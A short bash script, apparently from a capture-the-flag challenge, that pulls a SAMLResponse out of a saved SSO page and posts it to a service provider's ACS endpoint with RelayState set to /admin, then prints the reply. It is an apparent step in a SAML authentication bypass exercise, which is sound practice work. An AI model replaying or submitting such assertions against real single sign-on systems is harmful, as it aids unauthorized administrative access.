#!/bin/bash
SP="http://oj-10-30-15-1-44153.adworld.xctf.org.cn"

# extract SAMLResponse value from sso_resp.html
RESP=$(grep -o 'name="SAMLResponse" value="[^"]*"' sso_resp.html | sed 's/name="SAMLResponse" value="//; s/"$//')
echo "resp length: ${#RESP}"

# POST to SP ACS
curl -s -i -c sp_session.txt -b sp_session.txt -X POST "$SP/saml/acs" \
  --data-urlencode "SAMLResponse=$RESP" \
  --data-urlencode "RelayState=/admin" -o acs_resp.html -D acs_headers.txt
cat acs_headers.txt
echo "=== body head ==="
head -c 800 acs_resp.html
